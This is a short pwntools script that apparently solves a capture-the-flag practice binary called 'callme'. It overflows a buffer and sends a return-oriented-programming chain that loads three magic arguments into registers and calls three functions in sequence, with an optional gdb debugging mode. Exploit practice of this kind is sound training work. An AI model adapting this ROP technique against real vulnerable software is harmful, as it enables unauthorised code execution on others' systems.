from pwn import p64, process, gdb, args

if args.GDB:
    p = gdb.debug("./callme", """
    b *pwnme+89
    continue    
    """)
else:
    p = process("./callme")

callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0)
first_par = p64(0xdeadbeefdeadbeef)
second_par = p64(0xcafebabecafebabe)
third_par = p64(0xd00df00dd00df00d)

gadget = p64(0x40093c) # pop rdi; pop rsi; pop rdx; ret

pop_rdi = p64(0x4009a3)
pop_rsi_rdx = p64(0x40093d)


p.recvuntil(b"> ")
payload = b"A"*40 + pop_rdi + first_par + pop_rsi_rdx + second_par + third_par + callme_one + pop_rdi + first_par + pop_rsi_rdx + second_par + third_par + callme_two + pop_rdi + first_par + pop_rsi_rdx + second_par + third_par + callme_three
p.send(payload)
p.interactive()
